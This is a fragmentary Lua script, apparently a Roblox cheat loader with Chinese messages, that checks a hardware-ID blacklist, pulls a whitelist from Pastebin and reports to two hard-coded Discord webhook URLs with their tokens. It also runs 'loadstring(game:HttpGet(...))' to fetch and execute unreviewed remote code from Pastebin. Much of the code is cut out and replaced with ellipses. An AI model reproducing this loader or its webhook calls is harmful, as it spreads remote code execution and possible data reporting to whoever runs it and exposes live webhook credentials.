...
function seed(name)
    local Webhook = "https://discordapp.com/api/webhooks/1241564003994570823/rzaG9B3KrYSe-kT9ByVmj-5rXl2w5A0RhHNc-mWvPmUiQo9btkU0uleLwPYlXS0RLf_B"
    ...
    function seed_try(zt,name)
      ...
      local Webhook = "https://discordapp.com/api/webhooks/1241563237460217856/-jDUxhmM2cV-lRK0GO5B_l5SYZQFbnDPAy9uKWVfM2DYIk4WHwKh-YbC7hgMfpESuw0Q"
...
if table.find(hwid_list,gethwid()) then
   game.Players.LocalPlayer:Kick("你已被忍工作室拉黑") 
       ...
       if as == nil then
           ...
           if Ren_zt == true then
loadstring(game:HttpGet("https://pastebin.com/raw/zJucH45b"))();
   ...
   --]]
    ...
    --锕game.Players.LocalPlayer.Name = "114514"




    local name = "鲨脚本"
    local whitelist = "https://pastebin.com/raw/WN2eXGHR"
    local kick = "没有白名单"
